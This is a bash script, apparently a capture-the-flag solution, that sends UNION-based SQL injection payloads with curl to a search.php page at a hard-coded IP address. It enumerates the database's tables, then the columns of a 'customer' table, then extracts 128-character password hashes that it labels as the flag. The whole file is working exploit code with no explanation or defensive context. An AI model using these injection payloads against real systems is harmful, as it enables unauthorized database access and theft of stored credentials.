#!/bin/bash

echo "[+] Retreiving tables in the current database"
curl -sk "https://46.105.49.65/1636701e9169/search.php" \
     -d "q=q=ff' union select '\$',group_concat(table_name),3,4,'\$' from information_schema.tables where table_schema=database()-- " \
    | grep -oE "\\\$[^'].+\\\$"

echo "[+] Retreive table columns"
curl -sk "https://46.105.49.65/1636701e9169/search.php" \
     -d "q=q=ff' union select '\$',group_concat(column_name),3,4,'\$' from information_schema.columns where table_name='customer'-- " \
    | grep -oE "\\\$[^'].+\\\$"

echo "[+] Retreiving flag (password)"
curl -sk "https://46.105.49.65/1636701e9169/search.php" \
     -d "q=q=ff' union select '\$',password,3,4,'\$' from customer where length(password) = 128-- " \
    | grep -oE '[0-9a-f]{128}'
